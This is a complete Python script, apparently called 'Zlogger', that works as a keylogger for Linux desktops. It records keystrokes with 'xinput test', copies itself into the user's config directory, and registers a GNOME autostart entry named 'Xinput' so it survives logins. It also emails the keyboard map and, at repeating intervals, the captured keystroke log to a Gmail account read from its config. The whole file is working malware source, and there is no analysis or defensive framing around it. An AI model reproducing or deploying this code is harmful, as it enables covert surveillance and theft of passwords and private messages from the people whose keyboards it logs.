#!/usr/bin/env python

import smtplib, re, os, stat, config
from shutil import copyfile
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from time import sleep
from subprocess import Popen, PIPE, check_output

EMAIL_SERVER = "smtp.gmail.com"

LOG_FILE = "/tmp/xinput.txt"
HOME_CONFIG_DIRECTORY = os.path.expanduser('~') + "/.config/"
AUTOSTART_PATH = HOME_CONFIG_DIRECTORY + "/autostart/"
AUTOSTART_FILE = AUTOSTART_PATH + "xinput.desktop"

AUTOSTART_ENTRY = """
[Desktop Entry]
Type=Application
X-GNOME-Autostart-enabled=true
Name=Xinput
"""

def send_mail(subject, content):
	msg = MIMEMultipart()
	msg['Subject'] = subject
	msg.attach(MIMEText(content))
	mailer = smtplib.SMTP(EMAIL_SERVER, 587)
	
	mailer.starttls()
	mailer.login(config.EMAIL, config.PASSWORD)

	mailer.sendmail(config.EMAIL, config.EMAIL, msg.as_string())
	mailer.close()


def start_logging(log_file):
	devices = check_output("xinput list | grep AT", shell=True)

	regex = re.compile('id=([^"]+)\t')
	keyboard_id = regex.findall(devices)[0]

	command = "xinput test " + keyboard_id + " > " + log_file
	Popen(command , shell=True)

def chmod_to_exec(file):
	os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)


def initialize():
	try:
	    os.makedirs(AUTOSTART_PATH)
	except OSError:
	    pass
	
	current_file = os.path.realpath(__file__).replace(".py", "")
	
	destination_file = HOME_CONFIG_DIRECTORY + config.FILE_NAME
	copyfile(current_file, destination_file)
	chmod_to_exec(destination_file)

	with open(AUTOSTART_FILE,'w') as out:
	    out.write(AUTOSTART_ENTRY + "Exec=" + destination_file + "\n")

	chmod_to_exec(AUTOSTART_FILE)

	#Get Keyboard map and send it
	kmap = check_output("xmodmap -pke", shell=True)
	send_mail("Zlogger Character Map",kmap)
	Popen(destination_file)

def send_mail_reports_every(interval):
	while True:
		sleep(interval)
		send_mail("Zlogger Report", file(LOG_FILE).read())
		with open(LOG_FILE, "w"):
			pass


if not os.path.isfile(AUTOSTART_FILE) :
	initialize()
else:
	start_logging(LOG_FILE)
	send_mail_reports_every(config.SLEEP_INTERVAL)
